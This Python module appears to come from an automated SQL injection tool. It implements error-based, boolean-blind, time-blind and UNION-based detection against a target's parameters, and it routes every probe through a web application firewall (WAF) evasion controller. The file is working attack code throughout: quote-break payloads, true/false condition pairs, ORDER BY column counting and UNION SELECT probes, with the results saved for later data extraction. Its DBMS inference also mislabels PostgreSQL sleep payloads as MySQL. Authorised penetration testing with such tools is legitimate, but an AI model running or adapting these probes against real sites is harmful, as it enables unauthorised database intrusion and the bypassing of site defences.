"""Injection detection techniques.

Every probe is sent through the :class:`~smartsql.adaptive.AdaptiveController`,
so all four techniques inherit WAF evasion and timing adaptation for free.

Techniques implemented:

* **error-based**  - provoke a DB error and fingerprint the DBMS from it.
* **boolean-based blind** - compare responses for a TRUE vs FALSE condition.
* **time-based blind** - inject dialect-specific delays and measure latency.
* **UNION query-based** - discover the column count via ``ORDER BY`` growth.
"""

from __future__ import annotations

from dataclasses import dataclass
from difflib import SequenceMatcher
from typing import List, Optional

from . import dbms as dbms_mod
from .adaptive import AdaptiveController
from .engine import Response
from .models import DBMS, Finding, InjectionPoint, Outcome, Technique
from .target import Target


def _similarity(a: str, b: str) -> float:
    """Cheap 0..1 body similarity, robust to large pages."""
    if not a and not b:
        return 1.0
    a, b = a[:6000], b[:6000]
    return SequenceMatcher(None, a, b).ratio()


@dataclass
class TechniqueResult:
    finding: Optional[Finding]
    detail: str


class Detector:
    def __init__(self, controller: AdaptiveController, target: Target) -> None:
        self.ctrl = controller
        self.target = target
        self._baseline: Optional[Response] = None

    def baseline(self) -> Response:
        if self._baseline is None:
            self._baseline = self.ctrl.engine.send(self.target.baseline())
        return self._baseline

    # ------------------------------------------------------------------ #
    def error_based(self, point: InjectionPoint) -> TechniqueResult:
        # (payload, prefix, suffix) - prefix/suffix are the context to reuse
        # when rebuilding valid queries for extraction.
        probes = [
            ("'", "'", "-- -"),
            ('"', '"', "-- -"),
            ("')", "')", "-- -"),
            ("';", "'", "-- -"),
            ("`", "`", "-- -"),
        ]
        for payload, prefix, suffix in probes:
            res = self.ctrl.send(self.target, point, payload)
            resp = res.response
            if resp.outcome == Outcome.NETWORK_ERROR:
                continue
            found = dbms_mod.fingerprint_from_error(resp.text)
            if found is not DBMS.UNKNOWN:
                return TechniqueResult(
                    Finding(
                        point=point,
                        technique=Technique.ERROR,
                        dbms=found,
                        payload=res.payload_sent,
                        tamper_chain=res.chain,
                        notes="DB error message leaked",
                        prefix=prefix,
                        suffix=suffix,
                    ),
                    f"error-based hit: {found.value}",
                )
        return TechniqueResult(None, "no DB error provoked")

    # ------------------------------------------------------------------ #
    def boolean_based(self, point: InjectionPoint) -> TechniqueResult:
        base = self.baseline()
        # (prefix, suffix) across common injection contexts. TRUE/FALSE
        # conditions are built from these so the winning context can be
        # recorded on the finding and reused for extraction.
        contexts = [
            ("'", "-- -"),
            ('"', "-- -"),
            ("", ""),          # numeric context, no quote
            ("')", "-- -"),
            ("'", "#"),        # MySQL hash comment
        ]
        for prefix, suffix in contexts:
            true_p = f"{prefix} AND 1=1{suffix}"
            false_p = f"{prefix} AND 1=2{suffix}"
            t = self.ctrl.send(self.target, point, true_p).response
            f = self.ctrl.send(self.target, point, false_p).response
            if Outcome.NETWORK_ERROR in (t.outcome, f.outcome):
                continue

            sim_true = _similarity(base.text, t.text)
            sim_false = _similarity(base.text, f.text)
            # Injectable when TRUE mirrors the baseline but FALSE diverges.
            if sim_true > 0.95 and (sim_true - sim_false) > 0.1:
                return TechniqueResult(
                    Finding(
                        point=point,
                        technique=Technique.BOOLEAN,
                        payload=true_p,
                        prefix=prefix,
                        suffix=suffix,
                        notes=(
                            f"TRUE~baseline sim={sim_true:.2f}, "
                            f"FALSE sim={sim_false:.2f}"
                        ),
                    ),
                    f"boolean-based hit (Δsim={sim_true - sim_false:.2f})",
                )
        return TechniqueResult(None, "no boolean differential observed")

    # ------------------------------------------------------------------ #
    def time_based(
        self,
        point: InjectionPoint,
        delay: int = 5,
        dbms: DBMS = DBMS.UNKNOWN,
    ) -> TechniqueResult:
        base = self.baseline()
        base_latency = base.elapsed or 0.0
        for payload in dbms_mod.time_payloads(dbms, delay):
            res = self.ctrl.send(self.target, point, payload)
            resp = res.response
            if resp.outcome == Outcome.NETWORK_ERROR:
                continue
            # Confirmed only if the delay clearly exceeds baseline latency.
            if resp.elapsed >= max(delay - 1, base_latency + delay * 0.6):
                # Second confirmation to rule out a one-off slow response.
                confirm = self.ctrl.send(self.target, point, payload).response
                if confirm.elapsed >= max(delay - 1, base_latency + delay * 0.6):
                    prefix, suffix = self._context_of(payload)
                    return TechniqueResult(
                        Finding(
                            point=point,
                            technique=Technique.TIME,
                            dbms=self._infer_dbms(payload, dbms),
                            payload=res.payload_sent,
                            tamper_chain=res.chain,
                            notes=f"induced ~{resp.elapsed:.1f}s delay",
                            prefix=prefix,
                            suffix=suffix,
                        ),
                        f"time-based hit (~{resp.elapsed:.1f}s)",
                    )
        return TechniqueResult(None, "no reliable time delay induced")

    # ------------------------------------------------------------------ #
    def union_based(
        self, point: InjectionPoint, max_columns: int = 12
    ) -> TechniqueResult:
        base = self.baseline()
        # Find column count via ORDER BY: valid N stays baseline-like, an
        # over-count breaks the query (error / divergence).
        last_ok = 0
        for n in range(1, max_columns + 1):
            res = self.ctrl.send(self.target, point, f"' ORDER BY {n}-- -")
            resp = res.response
            if resp.outcome == Outcome.NETWORK_ERROR:
                break
            if dbms_mod.has_sql_error(resp.text) or _similarity(base.text, resp.text) < 0.9:
                break
            last_ok = n

        if last_ok >= 1:
            cols = ",".join(["NULL"] * last_ok)
            res = self.ctrl.send(self.target, point, f"' UNION SELECT {cols}-- -")
            resp = res.response
            if resp.outcome != Outcome.NETWORK_ERROR and not dbms_mod.has_sql_error(
                resp.text
            ):
                return TechniqueResult(
                    Finding(
                        point=point,
                        technique=Technique.UNION,
                        dbms=dbms_mod.fingerprint_from_error(resp.text),
                        payload=res.payload_sent,
                        tamper_chain=res.chain,
                        notes=f"{last_ok} columns",
                        prefix="'",
                        suffix="-- -",
                        columns=last_ok,
                    ),
                    f"UNION-based hit ({last_ok} columns)",
                )
        return TechniqueResult(None, "no stable UNION column count found")

    # ------------------------------------------------------------------ #
    @staticmethod
    def _context_of(payload: str) -> tuple[str, str]:
        prefix = ""
        if payload.startswith("'"):
            prefix = "'"
        elif payload.startswith('"'):
            prefix = '"'
        suffix = "-- -" if "-- -" in payload else ""
        return prefix, suffix

    @staticmethod
    def _infer_dbms(payload: str, current: DBMS) -> DBMS:
        p = payload.upper()
        if "SLEEP" in p or "BENCHMARK" in p:
            return DBMS.MYSQL
        if "PG_SLEEP" in p:
            return DBMS.POSTGRESQL
        if "WAITFOR DELAY" in p:
            return DBMS.MSSQL
        if "DBMS_PIPE" in p:
            return DBMS.ORACLE
        if "RANDOMBLOB" in p:
            return DBMS.SQLITE
        return current
